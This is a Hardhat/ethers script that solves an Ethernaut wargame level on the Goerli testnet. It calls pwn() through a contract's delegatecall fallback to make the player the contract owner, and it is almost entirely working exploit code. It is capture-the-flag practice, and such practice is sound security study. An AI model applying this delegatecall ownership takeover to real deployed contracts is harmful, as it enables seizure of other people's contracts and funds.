import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackToken = async () => {
    // change contract addresses here.
    const tokenAddress = "0xfA73fdB5d3C0c146624709eb6B1B94482B45dD7A"; //type "await contract.address()" in ethernaut console
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)

    // Don't touch below 🚀
    // Vulnerability from pwn() function with delegatecall in fallback to change owner
    // additional read:
    // https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [{ internalType: "address", name: "_delegateAddress", type: "address" }],
            outputs: [],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "constructor",
        },
        {
            stateMutability: "nonpayable",
            type: "fallback",
        },
        {
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, tokenAddress);
    console.log("Checking current player balance...");
    const oldOwner = await contract.owner();
    console.log(`Current contract owner: ${oldOwner}`);
    // using my custom rpc stored in .env (for privacy)
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const PRIVATE_KEY =
        process.env.PRIVATE_KEY || ""; /*Private Keys in .env file or hardcode here*/
    const wallet = new Wallet(PRIVATE_KEY, provider);
    // endoding function here
    console.log("Encoding function signature...");
    const funcSign = ["function pwn()"];
    const iface = new ethers.utils.Interface(funcSign);
    const signature = iface.encodeFunctionData("pwn()");
    // sending transaction here
    console.log("Now sending transaction to call fallback ...");
    const tx2 = await wallet.sendTransaction({
        from: player,
        to: tokenAddress,
        data: signature,
    });
    const txReceipt = await tx2.wait(1);
    console.log(txReceipt);
    console.log("Checking that player is now owner...");
    const newOwner = await contract.owner();
    console.log(`Contract Owner is now: ${newOwner}`);
    const owner = newOwner === player;
    console.log(`Player is now owner: ${owner}`);
    if (owner) {
        console.log("Congrats! Player is now the new owner...");
        console.log("Done...submit in ethernaut");
    } else {
        console.log("Player is not owner, please review code above");
    }
};

attackToken()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
